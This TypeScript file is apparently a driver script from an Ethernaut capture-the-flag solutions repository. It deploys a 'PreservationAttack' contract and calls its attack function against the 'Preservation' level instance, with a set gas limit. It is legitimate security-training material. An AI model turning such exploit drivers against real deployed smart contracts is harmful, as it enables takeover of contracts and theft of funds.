import { PreservationAttack } from '../../typechain-types';
import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const PRESERVATION_LEVEL_NAME = "Preservation"

export const preservationAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
            console.log('Deploying PreservationAttacker');

            const contract = await ethereum.deployContract<PreservationAttack>('PreservationAttack');
            console.log('Attacker deployed at: ', await contract.getAddress(), ' Perfoming the attack');

            const player = await ethereum.getPlayerAddress();
            // specifying gasLimit is important, without it default gas estimation is to low and not all the code gets executed
            // https://forum.openzeppelin.com/t/ethernaut-preservation-lvl-16-different-output-while-using-testnet-and-local-network/8241
            const attackTx = await contract.attack(instanceAddress, player, { gasLimit: 100000 });
            await attackTx.wait();
        }
    }
}